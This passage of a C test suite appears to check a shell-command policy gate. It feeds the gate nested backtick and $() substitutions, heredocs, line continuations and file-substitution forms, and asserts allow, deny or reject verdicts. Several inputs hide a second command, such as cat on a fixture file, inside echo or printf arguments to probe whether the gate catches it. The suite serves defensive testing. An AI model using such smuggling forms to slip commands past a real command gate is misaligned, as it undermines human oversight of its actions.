      "echo `printf x # note` $\"translated\"",
      "echo `printf x # note` >$\"translated\"",
      "echo \"`printf '\"$\"literal\"'`\" $\"translated\"",
  };
  for (size_t i = 0; i < sizeof(rejected) / sizeof(rejected[0]); i++) {
    ASSERT(eval_cmd(gate, rejected[i], &result) == SG_ERR_PARSE);
    ASSERT(result.verdict == SG_VERDICT_REJECT &&
           result.anomaly_update == SG_ANOMALY_UPDATE_NOT_ATTEMPTED &&
           test_anomaly_vocabulary(gate) == vocabulary);
  }
  sg_gate_free(gate);
}

TEST(backtick_escape_semantic_contract) {
  const char *rules[] = {"echo *", "printf * *", "printf * * *"};
  sg_gate_t *gate = gate_with_rules(rules, 3);
  ASSERT(gate != NULL);
  ASSERT_SG_OK(sg_gate_set_reject_mask(gate, 0));
  ASSERT_SG_OK(sg_gate_set_stop_mode(gate, SG_EVAL_ALL));
  ASSERT_ST_OK(test_policy_replace_cpl(gate, true, "cat *", false));
  ASSERT_SG_OK(sg_gate_enable_anomaly(gate, 1000000.0, NULL));
  sg_result_t result;
  ASSERT_SG_OK(eval_cmd(gate, "echo ordinary", &result));
  size_t vocabulary = test_anomaly_vocabulary(gate);
  static const char source[] = "echo `printf %s \\`cat /fixture/input\\``";
  ASSERT(eval_cmd(gate, source, &result) == SG_ERR_PARSE);
  /* Parse rejection retains one diagnostic, never a policy-evaluable argv. */
  ASSERT(result.verdict == SG_VERDICT_REJECT && result.subcommand_count == 1);
  ASSERT(result.subcommands[0].verdict == SG_VERDICT_REJECT &&
         !result.subcommands[0].matches &&
         result.subcommands[0].netargv == NULL &&
         result.subcommands[0].netargv_length == 0);
  ASSERT(result.anomaly_update == SG_ANOMALY_UPDATE_NOT_ATTEMPTED &&
         test_anomaly_vocabulary(gate) == vocabulary);
  /* The equivalent modern form remains analyzable and reaches the deny. */
  ASSERT_SG_OK(
      eval_cmd(gate, "echo $(printf %s $(cat /fixture/input))", &result));
  ASSERT(result.verdict == SG_VERDICT_DENY && result.subcommand_count == 3);
  sg_gate_free(gate);
}

TEST(scoped_heredoc_semantic_contract) {
  const char *rules[] = {"cat", "printf *"};
  sg_gate_t *gate = gate_with_rules(rules, 2);
  ASSERT(gate != NULL);
  ASSERT_SG_OK(sg_gate_set_stop_mode(gate, SG_EVAL_ALL));
  ASSERT_SG_OK(sg_gate_enable_anomaly(gate, 1000000.0, NULL));
  for (size_t i = 0; i < sizeof(shellsplit_test_scoped_expansions) /
                             sizeof(shellsplit_test_scoped_expansions[0]);
       i++) {
    const shellsplit_test_expansion_case_t *fixture =
        &shellsplit_test_scoped_expansions[i];
    ASSERT_SG_OK(sg_gate_set_reject_mask(gate, 0));
    sg_result_t result;
    sg_error_t status = eval_cmd(gate, fixture->source, &result);
    if (!fixture->supported) {
      ASSERT(status == SG_ERR_PARSE && result.verdict == SG_VERDICT_REJECT);
      continue;
    }
    ASSERT(status == SG_OK && result.verdict != SG_VERDICT_REJECT);
    /* Each FILE shortcut fixture has one argv-less anomaly stage represented
     * directly as a graph document, not a policy command result. */
    if (result.subcommand_count + fixture->file_stages != fixture->stages)
      fprintf(stderr, "scoped command-count mismatch: %s\n", fixture->source);
    ASSERT(result.subcommand_count + fixture->file_stages == fixture->stages);
    ASSERT(result.requires_substitution_evaluation ==
           ((fixture->features & SHELL_FEAT_SUBSHELL) != 0));
    const uint32_t masks[] = {SHELL_FEAT_VARS,         SHELL_FEAT_SUBSHELL,
                              SHELL_FEAT_ARITH,        SHELL_FEAT_ARRAY,
                              SHELL_FEAT_PROCESS_SUB,  SHELL_FEAT_ANSI_C_QUOTE,
                              SHELL_FEAT_SUBSHELL_FILE};
    for (size_t m = 0; m < sizeof(masks) / sizeof(masks[0]); m++) {
      ASSERT_SG_OK(sg_gate_set_reject_mask(gate, masks[m]));
      ASSERT_SG_OK(eval_cmd(gate, fixture->source, &result));
      ASSERT((result.verdict == SG_VERDICT_REJECT) ==
             ((fixture->features & masks[m]) != 0));
    }
  }
  ASSERT_SG_OK(sg_gate_set_reject_mask(gate, 0));
  ASSERT_ST_OK(test_policy_replace_cpl(gate, true, "printf *", false));
  sg_result_t result;
  ASSERT_SG_OK(eval_cmd(gate, "cat <<EOF\n${missing#'$(printf phantom)'}\nEOF",
                        &result));
  ASSERT(result.verdict == SG_VERDICT_ALLOW && result.subcommand_count == 1);
  ASSERT_SG_OK(
      eval_cmd(gate, "cat <<EOF\n${missing:-'$(printf child)'}\nEOF", &result));
  ASSERT(result.verdict == SG_VERDICT_DENY && result.subcommand_count == 2);
  sg_gate_free(gate);
}

TEST(file_substitution_reject_mask_contract) {
  sg_gate_t *gate = gate_with_rules((const char *[]){"printf *", "cat"}, 2);
  ASSERT(gate != NULL);
  ASSERT_SG_OK(sg_gate_set_reject_mask(gate, SHELL_FEAT_SUBSHELL_FILE));
  static const struct {
    const char *source;
    bool rejected;
  } cases[] = {
      {"printf $(<file)", true},
      {"printf \"$(0<file)\"", true},
      {"printf \"$(00<file;)\"", true},
      {"printf \"$(# heading\n<file)\"", true},
      {"printf \"$(<file printf ok)\"", false},
      {"printf \"$(1<file)\"", false},
      {"printf \"$(<file <other)\"", false},
      {"printf \"$(printf ok # $(<file)\n)\"", false},
      {"printf \"$( <file)\"", true},
      {"printf \"${v:-$(<file)}\"", true},
      {"printf \"${v:-'$\\\n( <file)'}\"", true},
      {"printf '${v:-$(<file)}'", false},
      {"printf \"${v#'$(<file)'}\"", false},
      {"cat <<EOF\n$(<file)\nEOF", true},
      {"cat <<EOF\n${v:-'$(<file)'}\nEOF", true},
      {"cat <<EOF\n${v#'$(<file)'}\nEOF", false},
      {"cat <<'EOF'\n$(<file)\nEOF", false},
      {"printf \"$(cat <<'EOF'\n$(<file)\nEOF\n)\"", false},
      {"printf \"$(cat <<EOF\n'$(<file)'\nEOF\n)\"", true},
      {"printf \"$(cat <<EOF\n${v#'$(<file)'}\nEOF\n)\"", false},
  };
  for (size_t i = 0; i < sizeof(cases) / sizeof(cases[0]); i++) {
    sg_result_t result;
    ASSERT_SG_OK(eval_cmd(gate, cases[i].source, &result));
    ASSERT((result.verdict == SG_VERDICT_REJECT) == cases[i].rejected);
    shell_parse_result_t parsed;
    ASSERT(shell_parse_fast(cases[i].source, strlen(cases[i].source), NULL,
                            &parsed) == SHELL_OK);
    uint32_t features = 0;
    for (uint32_t r = 0; r < parsed.count; r++)
      features |= parsed.cmds[r].features;
    ASSERT(((features & SHELL_FEAT_SUBSHELL_FILE) != 0) == cases[i].rejected);
  }
  sg_gate_free(gate);
}

TEST(nested_feature_rejection_contract) {
  sg_gate_t *gate = gate_with_rules((const char *[]){"printf *", "cat"}, 2);
  ASSERT(gate != NULL);
  static const struct {
    const char *source;
    uint32_t feature;
    bool present;
  } cases[] = {
      {"printf \"$(cat <<EOF\nbody\nEOF\n)\"", SHELL_FEAT_HEREDOC, true},
      {"printf \"$(cat <<<word)\"", SHELL_FEAT_HERESTRING, true},
      {"printf \"$(printf x | cat)\"", SHELL_FEAT_PIPELINE, true},
      {"printf ${v:-$(printf x | cat)}", SHELL_FEAT_PIPELINE, true},
      {"printf \"`cat <<EOF\nbody\nEOF\n`\"", SHELL_FEAT_HEREDOC, true},
      {"printf \"$(printf ok # <<<word\n)\"", SHELL_FEAT_HERESTRING, false},
      {"printf \"$(printf ok # $VALUE * &>file\n)\"",
       SHELL_FEAT_VARS | SHELL_FEAT_GLOBS | SHELL_FEAT_COMBINED_REDIRECT,
       false},
      {"printf \"$(printf 'a|b')\"", SHELL_FEAT_PIPELINE, false},
      {"printf \"$(printf x || cat)\"", SHELL_FEAT_PIPELINE, false},
  };
  for (size_t i = 0; i < sizeof(cases) / sizeof(cases[0]); i++) {
    ASSERT_SG_OK(sg_gate_set_reject_mask(gate, cases[i].feature));
    sg_result_t result;
    ASSERT_SG_OK(eval_cmd(gate, cases[i].source, &result));
    ASSERT((result.verdict == SG_VERDICT_REJECT) == cases[i].present);
    shell_parse_result_t parsed;
    ASSERT(shell_parse_fast(cases[i].source, strlen(cases[i].source), NULL,
                            &parsed) == SHELL_OK);
    uint32_t features = 0;
    for (uint32_t j = 0; j < parsed.count; j++)
      features |= parsed.cmds[j].features;
    ASSERT(((features & cases[i].feature) != 0) == cases[i].present);
  }
  for (unsigned conditional = 0; conditional < 2; ++conditional) {
    for (size_t i = 0; i < sizeof(shellsplit_test_extglob_features) /
                               sizeof(shellsplit_test_extglob_features[0]);
         ++i) {
      char source[256];
      snprintf(source, sizeof(source),
               conditional ? "[[ -n %s ]]" : "printf %s",
               shellsplit_test_extglob_features[i].word);
      for (uint32_t bit = 1; bit <= SHELL_FEAT_COMBINED_REDIRECT; bit <<= 1) {
        if (bit == SHELL_FEAT_CONDITIONALS)
          continue;
        ASSERT_SG_OK(sg_gate_set_reject_mask(gate, bit));
        sg_result_t result;
        ASSERT_SG_OK(eval_cmd(gate, source, &result));
        ASSERT((result.verdict == SG_VERDICT_REJECT) ==
               ((shellsplit_test_extglob_features[i].features & bit) != 0));
      }
    }
  }
  ASSERT_SG_OK(sg_gate_set_reject_mask(gate, SG_REJECT_MASK_DEFAULT));
  sg_result_t result;
  ASSERT_SG_OK(eval_cmd(gate, cases[0].source, &result));
  ASSERT(result.verdict == SG_VERDICT_REJECT);
  ASSERT_SG_OK(eval_cmd(gate, cases[1].source, &result));
  ASSERT(result.verdict == SG_VERDICT_REJECT);
  sg_gate_free(gate);
}

static SHELL_NONNULL(1, 2, 3, 4) shell_expand_status_t
    conditional_value(const shell_expand_word_request_t *request,
                      const char **value, size_t *length, void *context) {
  if (request->purpose != SHELL_EXPAND_WORD_CONDITIONAL)
    return SHELL_EXPAND_UNRESOLVED;
  *value = context;
  *length = strlen(context);
  return SHELL_EXPAND_RESOLVED;
}

TEST(variable_presence_contract) {
  sg_gate_t *gate =
      gate_with_rules((const char *[]){"test -v *", "\"[\" -v * -o ! -v * ]",
                                       "test x -o -n *", "printf *"},
                      4);
  ASSERT(gate != NULL);
  ASSERT_SG_OK(sg_gate_set_stop_mode(gate, SG_EVAL_ALL));
  sg_result_t result;
  ASSERT_SG_OK(eval_cmd(gate, "[[ -v CONFIG ]]", &result));
  ASSERT(result.verdict == SG_VERDICT_REJECT);
  ASSERT_SG_OK(sg_gate_set_reject_mask(gate, 0));
  ASSERT_SG_OK(eval_cmd(gate, "[[ -v CONFIG ]]", &result));
  ASSERT(result.verdict == SG_VERDICT_ALLOW && !result.subcommand_count &&
         !result.unresolved_expansion_flags &&
         !result.requires_substitution_evaluation);
  ASSERT_SG_OK(eval_cmd(gate, "test -v CONFIG", &result));
  ASSERT(result.verdict == SG_VERDICT_ALLOW && result.subcommand_count == 1);
  ASSERT_SG_OK(eval_cmd(gate, "[ -v CONFIG -o ! -v OTHER ]", &result));
  ASSERT(result.verdict == SG_VERDICT_ALLOW && result.subcommand_count == 1);
  ASSERT_SG_OK(eval_cmd(gate, "test x -o -n \"$(printf marker)\"", &result));
  ASSERT(result.verdict == SG_VERDICT_ALLOW_CONDITIONAL &&
         result.subcommand_count == 2 &&
         result.requires_substitution_evaluation &&
         result.has_dynamic_substitution_io);
  ASSERT(eval_cmd(gate, "[[ -v \"$name\" ]]", &result) == SG_ERR_PARSE);
  ASSERT(eval_cmd(gate, "[[ -v 'a[$(printf marker)]' ]]", &result) ==
         SG_ERR_PARSE);
  sg_gate_free(gate);
}

TEST(filesystem_predicate_contract) {
  sg_gate_t *gate =
      gate_with_rules((const char *[]){"test -N *", "\"[\" -G * ]"}, 2);
  ASSERT(gate != NULL);
  ASSERT_SG_OK(sg_gate_set_stop_mode(gate, SG_EVAL_ALL));
  ASSERT_SG_OK(sg_gate_set_reject_mask(gate, 0));
  static const char *const operators[] = {"-r", "-w", "-x", "-u", "-g",
                                          "-k", "-O", "-G", "-N"};
  sg_result_t result;
  for (unsigned i = 0; i < sizeof(operators) / sizeof(*operators); ++i) {
    char source[64];
    snprintf(source, sizeof(source), "[[ %s target ]]", operators[i]);
    ASSERT_SG_OK(eval_cmd(gate, source, &result));
    ASSERT(result.verdict == SG_VERDICT_ALLOW && !result.subcommand_count &&
           !result.unresolved_expansion_flags);
  }
  ASSERT_SG_OK(eval_cmd(gate, "test -N target", &result));
  ASSERT(result.verdict == SG_VERDICT_ALLOW && result.subcommand_count == 1);
  ASSERT_SG_OK(eval_cmd(gate, "[ -G target ]", &result));
  ASSERT(result.verdict == SG_VERDICT_ALLOW && result.subcommand_count == 1);
  ASSERT_SG_OK(eval_cmd(gate, "test -r target", &result));
  ASSERT(result.verdict == SG_VERDICT_UNDETERMINED &&
         result.subcommand_count == 1);
  sg_gate_free(gate);
}

TEST(conditional_string_contract) {
  sg_gate_t *gate = gate_with_rules((const char *[]){"printf *"}, 1);
  ASSERT(gate != NULL);
  ASSERT_SG_OK(sg_gate_set_stop_mode(gate, SG_EVAL_ALL));
  sg_result_t result;
  ASSERT_SG_OK(eval_cmd(gate, "[[ -n x ]]", &result));
  ASSERT(result.verdict == SG_VERDICT_REJECT);
  ASSERT_SG_OK(sg_gate_set_reject_mask(gate, 0));
  static const char *const invalid_boundaries[] = {
      "[[ x == \"x\" ]", "[[ -n x ]",  "[[ x !",       "[[ x =\\",
      "[[ x\n]]",        "[[ ! x\n]]", "[[ ! ! x\n]]", "[[ '-n'\n]]",
      "[[ x # note\n]]", "[[ x\n",
  };
  for (size_t i = 0;
       i < sizeof(invalid_boundaries) / sizeof(invalid_boundaries[0]); ++i)
    ASSERT(eval_cmd(gate, invalid_boundaries[i], &result) == SG_ERR_PARSE);
  ASSERT_SG_OK(eval_cmd(gate, "[[ -z '' ]]", &result));
  ASSERT(result.verdict == SG_VERDICT_ALLOW && result.subcommand_count == 0);
  ASSERT_SG_OK(eval_cmd(gate, "[[ -f config.json ]]", &result));
  ASSERT(result.verdict == SG_VERDICT_ALLOW && !result.subcommand_count &&
         !result.unresolved_expansion_flags);
  ASSERT_SG_OK(eval_cmd(gate, "[[ -N \"$path\" ]]", &result));
  ASSERT(
      result.verdict == SG_VERDICT_ALLOW &&
      (result.unresolved_expansion_flags & SG_EXPANSION_UNRESOLVED_PATH) &&
      (result.unresolved_expansion_flags & SG_EXPANSION_UNRESOLVED_CONDITION));
  ASSERT_SG_OK(eval_cmd(gate, "[[ x == \"x\" ]]", &result));
  ASSERT(result.verdict == SG_VERDICT_ALLOW && !result.subcommand_count);
  ASSERT_SG_OK(eval_cmd(gate, "[[ file.txt == *.txt ]]", &result));
  ASSERT(result.verdict == SG_VERDICT_ALLOW && !result.subcommand_count &&
         !result.unresolved_expansion_flags);
  ASSERT_SG_OK(sg_gate_set_reject_mask(gate, SHELL_FEAT_GLOBS));
  ASSERT_SG_OK(eval_cmd(gate, "[[ file.txt == *.txt ]]", &result));
  ASSERT(result.verdict == SG_VERDICT_REJECT);
  ASSERT_STR(result.deny_reason, "glob pattern not allowed");
  ASSERT_SG_OK(eval_cmd(gate, "printf '%s' *.txt", &result));
  ASSERT(result.verdict == SG_VERDICT_REJECT);
  ASSERT_STR(result.deny_reason, "glob pattern not allowed");
  ASSERT_SG_OK(eval_cmd(gate, "[[ '*' == '*' ]]", &result));
  ASSERT(result.verdict == SG_VERDICT_ALLOW);
  ASSERT_SG_OK(eval_cmd(gate, "[[ x == \"$value\".txt ]]", &result));
  ASSERT(result.verdict == SG_VERDICT_ALLOW &&
         result.unresolved_expansion_flags ==
             SG_EXPANSION_UNRESOLVED_CONDITION);
  ASSERT_SG_OK(eval_cmd(gate, "[[ x == \"$value\"'?[()]' ]]", &result));
  ASSERT(result.verdict == SG_VERDICT_ALLOW);
  ASSERT_SG_OK(sg_gate_set_reject_mask(gate, 0));
  static const char *const comparisons[] = {
      "[[ $left == \"x\" ]]",
      "[[ x == \"$right\" ]]",
      "[[ $left != \"$right\" ]]",
      "[[ name=~ == 'name=~' ]]",
      "[[ name=prefix:~ == 'name=prefix:~' ]]",
      "[[ arr[0]=~ == 'arr[0]=~' ]]",
      "[[ arr['0']+=~ == 'arr[0]+=~' ]]",
      "[[ $left == *.txt ]]",
      "[[ $left == \"$right\".txt ]]",
      "[[ $left != release-\"$right\" ]]",
  };
  for (unsigned i = 0; i < sizeof(comparisons) / sizeof(comparisons[0]); ++i) {
    ASSERT_SG_OK(eval_cmd(gate, comparisons[i], &result));
    ASSERT(result.verdict == SG_VERDICT_ALLOW && !result.subcommand_count);
    ASSERT(result.unresolved_expansion_flags ==
           SG_EXPANSION_UNRESOLVED_CONDITION);
  }
  static const char *const literal_tildes[] = {
      "[[ name='~' == 'name=~' ]]",
      "[[ name=~'' == 'name=~' ]]",
      "[[ name\\=~ == 'name=~' ]]",
      "[[ ~'' == '~' ]]",
  };
  for (size_t i = 0; i < sizeof(literal_tildes) / sizeof(literal_tildes[0]);
       ++i) {
    ASSERT_SG_OK(eval_cmd(gate, literal_tildes[i], &result));
    ASSERT(result.verdict == SG_VERDICT_ALLOW && !result.subcommand_count &&
           !result.unresolved_expansion_flags);
  }
  ASSERT_SG_OK(eval_cmd(gate, "[[ x == \"$(printf value)\" ]]", &result));
  ASSERT(
      result.verdict == SG_VERDICT_ALLOW_CONDITIONAL &&
      result.subcommand_count == 1 && result.requires_substitution_evaluation &&
      result.has_dynamic_substitution_io &&
      result.unresolved_expansion_flags == SG_EXPANSION_UNRESOLVED_CONDITION);
  ASSERT_SG_OK(
      eval_cmd(gate, "[[ x == pre\"$(printf value)\"post ]]", &result));
  ASSERT(
      result.verdict == SG_VERDICT_ALLOW_CONDITIONAL &&
      result.subcommand_count == 1 && result.requires_substitution_evaluation &&
      result.has_dynamic_substitution_io &&
      result.unresolved_expansion_flags == SG_EXPANSION_UNRESOLVED_CONDITION);
  ASSERT_SG_OK(eval_cmd(gate, "[[ x == \"$(cat)\" ]]", &result));
  ASSERT(result.verdict == SG_VERDICT_UNDETERMINED &&
         result.subcommand_count == 1);
  ASSERT_SG_OK(eval_cmd(gate, "[[ x == \"x\" ]] >report", &result));
  ASSERT(result.verdict == SG_VERDICT_UNDETERMINED && !result.subcommand_count);
  ASSERT_SG_OK(sg_gate_set_reject_mask(gate, SHELL_FEAT_SUBSHELL));
  ASSERT_SG_OK(eval_cmd(gate, "[[ x == \"$(printf x)\" ]]", &result));
  ASSERT(result.verdict == SG_VERDICT_REJECT);
  ASSERT_SG_OK(sg_gate_set_reject_mask(gate, SHELL_FEAT_ARITH));
  ASSERT_SG_OK(eval_cmd(gate, "[[ x == \"$((1))\" ]]", &result));
  ASSERT(result.verdict == SG_VERDICT_REJECT);
  ASSERT_SG_OK(sg_gate_set_reject_mask(gate, 0));

  ASSERT_SG_OK(eval_cmd(gate, "[[ -n x # note\n]]", &result));
  ASSERT(result.verdict == SG_VERDICT_ALLOW && result.subcommand_count == 0);
  static const char *const commented[] = {
      "[[ # $(|)\n-n x ]]",
      "[[ ! # $(\n-n x ]]",
      "[[ -n x # ` ' \" ]] <(cat) $comment $((7)) ${bad\n]]",
  };
  for (size_t i = 0; i < sizeof(commented) / sizeof(commented[0]); ++i) {
    ASSERT_SG_OK(eval_cmd(gate, commented[i], &result));
    ASSERT(result.verdict == SG_VERDICT_ALLOW && result.subcommand_count == 0);
    ASSERT(!result.has_dynamic_substitution_io &&
           !result.requires_substitution_evaluation &&
           !result.unresolved_expansion_flags);
  }
  ASSERT_SG_OK(
      eval_cmd(gate, "[[ # ' comment\n-n $(printf value) # $(|)\n]]", &result));
  ASSERT(
      result.verdict == SG_VERDICT_ALLOW_CONDITIONAL &&
      result.subcommand_count == 1 && result.requires_substitution_evaluation &&
      result.has_dynamic_substitution_io &&
      (result.unresolved_expansion_flags & SG_EXPANSION_UNRESOLVED_CONDITION));
  ASSERT(eval_cmd(gate, "[[ # ignored\n-n $(|) ]]", &result) == SG_ERR_PARSE);
  ASSERT_SG_OK(eval_cmd(gate, "[[ -n $value ]]", &result));
  ASSERT(result.verdict == SG_VERDICT_ALLOW && result.subcommand_count == 0);
  ASSERT(result.unresolved_expansion_flags ==
         SG_EXPANSION_UNRESOLVED_CONDITION);
  ASSERT_SG_OK(eval_cmd(gate, "[[ -n $(printf value) ]]", &result));
  ASSERT(result.verdict == SG_VERDICT_ALLOW_CONDITIONAL &&
         result.subcommand_count == 1);
  ASSERT(result.has_dynamic_substitution_io &&
         result.requires_substitution_evaluation);
  ASSERT(result.unresolved_expansion_flags & SG_EXPANSION_UNRESOLVED_CONDITION);
  ASSERT_SG_OK(eval_cmd(gate, "[[ -n <(printf value) ]]", &result));
  ASSERT(result.verdict == SG_VERDICT_ALLOW && result.subcommand_count == 1);
  ASSERT(result.has_dynamic_substitution_io &&
         !result.requires_substitution_evaluation);
  ASSERT_SG_OK(eval_cmd(gate, "[[ -n x ]] >report", &result));
  ASSERT(result.verdict == SG_VERDICT_UNDETERMINED && !result.subcommand_count);
  ASSERT_SG_OK(eval_cmd(gate, "[[ -n $(printf value) ]] >report", &result));
  ASSERT(result.verdict == SG_VERDICT_UNDETERMINED &&
         result.subcommand_count == 1);
  ASSERT_SG_OK(eval_cmd(gate, "{ [[ -n x ]]; } >report", &result));
  ASSERT(result.verdict == SG_VERDICT_UNDETERMINED);
  ASSERT_SG_OK(sg_gate_set_expand_word_netargv(gate, conditional_value, "0:,"));
  ASSERT_SG_OK(eval_cmd(gate, "[[ -n $value ]]", &result));
  ASSERT(result.verdict == SG_VERDICT_ALLOW &&
         !result.unresolved_expansion_flags);
  ASSERT(result.subcommand_count == 0);
  ASSERT_SG_OK(
      sg_gate_set_expand_word_netargv(gate, conditional_value, "1:x,"));
  ASSERT_SG_OK(eval_cmd(gate, "[[ $left == \"$right\" ]]", &result));
  ASSERT(result.verdict == SG_VERDICT_ALLOW &&
         !result.unresolved_expansion_flags);
  for (size_t i = 0; i < sizeof(comparisons) / sizeof(comparisons[0]); ++i) {
    ASSERT_SG_OK(eval_cmd(gate, comparisons[i], &result));
    ASSERT(result.verdict == SG_VERDICT_ALLOW &&
           !result.unresolved_expansion_flags);
  }
  ASSERT_SG_OK(eval_cmd(gate, "[[ x == \"$(printf x)\" ]]", &result));
  ASSERT(result.verdict == SG_VERDICT_ALLOW_CONDITIONAL &&
         result.requires_substitution_evaluation &&
         result.has_dynamic_substitution_io &&
         !result.unresolved_expansion_flags);

  ASSERT_SG_OK(eval_cmd(gate, "[[ -n $value ]] && cat", &result));
  ASSERT(result.verdict == SG_VERDICT_UNDETERMINED &&
         result.subcommand_count == 1);
  ASSERT_SG_OK(sg_gate_set_expand_word_netargv(gate, conditional_value, ""));
  ASSERT(eval_cmd(gate, "[[ -n $value ]]", &result) == SG_ERR_EXPAND);
  ASSERT_SG_OK(sg_gate_set_expand_word_netargv(gate, NULL, NULL));
  ASSERT_SG_OK(sg_gate_enable_anomaly(gate, 100.0, NULL));
  ASSERT_SG_OK(eval_cmd(gate, "[[ -z '' ]]", &result));
  ASSERT(result.verdict == SG_VERDICT_ALLOW);
  ASSERT(eval_cmd(gate, "[[ x == ? ]]", &result) == SG_ERR_PARSE);
  sg_gate_free(gate);
}

static SHELL_NONNULL(1, 2, 3, 4) shell_expand_status_t
    builtin_test_value(const shell_expand_word_request_t *request,
                       const char **value, size_t *length, void *context) {
  if (request->purpose != SHELL_EXPAND_WORD_ARGUMENT)
    return SHELL_EXPAND_UNRESOLVED;
  *value = context;
  *length = strlen(*value);
  return SHELL_EXPAND_RESOLVED;
}

TEST(builtin_test_grammar_contract) {
  sg_gate_t *gate = gate_with_rules((const char *[]){"test * *"}, 1);
  ASSERT(gate != NULL);
  ASSERT_SG_OK(sg_gate_set_stop_mode(gate, SG_EVAL_ALL));
  sg_result_t result;
  ASSERT_SG_OK(eval_cmd(gate, "test \"$op\" target", &result));
  ASSERT(result.unresolved_expansion_flags & SG_EXPANSION_UNRESOLVED_ARGV);
  ASSERT(!(result.unresolved_expansion_flags & SG_EXPANSION_UNRESOLVED_PATH));
  ASSERT_SG_OK(
      sg_gate_set_expand_word_netargv(gate, builtin_test_value, "2:-n,"));
  ASSERT_SG_OK(eval_cmd(gate, "test \"$op\" target", &result));
  ASSERT(result.verdict == SG_VERDICT_ALLOW &&
         !result.unresolved_expansion_flags);
  ASSERT_SG_OK(
      sg_gate_set_expand_word_netargv(gate, builtin_test_value, "2:-e,"));
  ASSERT_SG_OK(eval_cmd(gate, "test \"$op\" target", &result));
  ASSERT(result.verdict == SG_VERDICT_ALLOW &&
         !result.unresolved_expansion_flags);
  sg_gate_free(gate);
}

TEST(command_token_capacity_contract) {
  static const unsigned counts[] = {32, 33, 47, 48, 49};
  for (unsigned c = 0; c < sizeof(counts) / sizeof(*counts); ++c) {
    char source[256] = "echo";
    size_t length = 4;
    for (unsigned i = 1; i < counts[c]; ++i) {
      memcpy(source + length, " a", 2);
      length += 2;
    }
    source[length] = 0;
    sg_gate_t *gate = gate_with_rules((const char *[]){source}, 1);
    ASSERT(gate != NULL);
    sg_result_t result;
    sg_error_t error = eval_cmd(gate, source, &result);
    if (counts[c] <= SHELL_DEP_MAX_TOKENS) {
      ASSERT(error == SG_OK && result.verdict == SG_VERDICT_ALLOW);
      ASSERT(!result.truncated && result.subcommand_count == 1);
    } else
      ASSERT(error == SG_ERR_TRUNC && result.truncated &&
             result.verdict == SG_VERDICT_UNDETERMINED);
    sg_gate_free(gate);
  }
}

TEST(static_arithmetic_literal_contract) {
  sg_gate_t *gate = gate_with_rules((const char *[]){"echo *"}, 1);
  ASSERT(gate != NULL);
  ASSERT_SG_OK(sg_gate_set_reject_mask(gate, 0));
  sg_result_t result;
  ASSERT_SG_OK(eval_cmd(
      gate, "echo $((2#1010 + 8#17 + 16#ff + 36#Z + 37#A + 64#_@ + (2**3)))",
      &result));
  ASSERT(result.verdict == SG_VERDICT_ALLOW && result.subcommand_count == 1);
  static const char *const invalid[] = {
      "echo $((08))",
      "echo $((2#))",
      "echo $((2#2))",
      "echo $((65#1))",
      "echo $((1 2))",
      "echo $((1 + ))",
      "echo $((0x))",
      "((02#1))",
      "((010#1))",
      "((016#f))",
      "((064#1))",
      "echo $((02#1))",
      "echo \"${value:02#1}\"",
      "echo \"${value:0:02#1}\"",
      "echo <<EOF\n$((02#1))\nEOF\n",
      "((02#1)) || echo fallback",
      "((02#1)) && echo success",
      "((1\r)) || echo fallback",
      "((1\v)) && echo success",
      "echo before; ((1\f)) || echo fallback",
      "echo $((1\r))",
      "echo \"${value:\v}\"",
      "echo \"${value:0:\f}\"",
      "(( $(printf 1; : 日本) ))",
      "(( `printf '%s' 日本` ))",
  };
  for (size_t i = 0; i < sizeof(invalid) / sizeof(invalid[0]); i++)
    ASSERT(eval_cmd(gate, invalid[i], &result) == SG_ERR_PARSE &&
           result.verdict == SG_VERDICT_REJECT);
  sg_gate_free(gate);
}

/* Shell lexical removal happens before policy evaluation too.  Keep these
 * source forms beside the ordinary substitution contracts: the physical line
 * ending must not turn a real executable producer into an unclassified word
 * or disconnect its dynamic-I/O provenance. */
TEST(continued_expansion_policy_contract) {
  static const char *const rules[] = {"echo *", "printf *", "cat", "cat *"};
  sg_gate_t *gate = gate_with_rules(rules, sizeof(rules) / sizeof(rules[0]));
  ASSERT(gate != NULL);
  ASSERT_SG_OK(sg_gate_set_reject_mask(gate, 0));
  ASSERT_SG_OK(sg_gate_set_stop_mode(gate, SG_EVAL_ALL));

  static const struct {
    const char *command;
    sg_verdict_t verdict;
    bool requires_evaluation;
    int32_t consumer;
  } cases[] = {
      {"echo $\\\n(printf child)", SG_VERDICT_ALLOW_CONDITIONAL, true, 0},
      {"cat <\\\n(printf input)", SG_VERDICT_ALLOW, false, 0},
      {"printf bytes > \\\n>(cat)", SG_VERDICT_ALLOW, false, -1},
  };
  for (size_t i = 0; i < sizeof(cases) / sizeof(cases[0]); i++) {
    sg_result_t result = {0};
    ASSERT_SG_OK(eval_cmd(gate, cases[i].command, &result));
    ASSERT(result.verdict == cases[i].verdict && result.subcommand_count == 2 &&
           result.has_dynamic_substitution_io &&
           result.requires_substitution_evaluation ==
               cases[i].requires_evaluation);
  }
  sg_gate_free(gate);
}

/* Shellgate receives original source, not pre-normalized syntax. A physical
 * continuation inside punctuation must therefore reach policy and I/O
 * accounting with the same canonical argv and verdict as Bash's compact
 * spelling, while Shellsplit retains the raw source span internally. */
TEST(continued_punctuation_policy_contract) {
  static const char *const rules[] = {"printf *", "cat"};
  static const struct {
    const char *compact;
    const char *continued;
  } cases[] = {
      {"printf x &>out", "printf x &\\\n>out"},
      {"printf x &>>out", "printf x &\\\n>\\\n>out"},
      {"printf x >&1", "printf x >\\\n&1"},
      {"printf x >|out", "printf x >\\\n|out"},
      {"cat <<<word", "cat <\\\n<\\\n<word"},
      {"cat <<EOF\nbody\nEOF\n", "cat <\\\n<EOF\nbody\nEOF\n"},
  };
  sg_gate_t *gate = gate_with_rules(rules, sizeof(rules) / sizeof(rules[0]));
  ASSERT(gate != NULL);
  ASSERT_SG_OK(sg_gate_set_reject_mask(gate, 0));
  ASSERT_SG_OK(sg_gate_set_stop_mode(gate, SG_EVAL_ALL));

  for (size_t i = 0; i < sizeof(cases) / sizeof(cases[0]); i++) {
    sg_result_t compact = {0};
    sg_result_t continued = {0};
    char netargv[128];
    ASSERT_SG_OK(eval_cmd(gate, cases[i].compact, &compact));
    ASSERT(compact.subcommand_count == 1 &&
           compact.subcommands[0].netargv_length < sizeof(netargv));
    size_t netargv_length = compact.subcommands[0].netargv_length;
    memcpy(netargv, compact.subcommands[0].netargv, netargv_length);
    sg_verdict_t verdict = compact.verdict;
    uint32_t writes = compact.subcommands[0].write_count;
    uint32_t reads = compact.subcommands[0].read_count;
    ASSERT_SG_OK(eval_cmd(gate, cases[i].continued, &continued));
    ASSERT(continued.verdict == verdict && continued.subcommand_count == 1 &&
           continued.subcommands[0].netargv_length == netargv_length &&
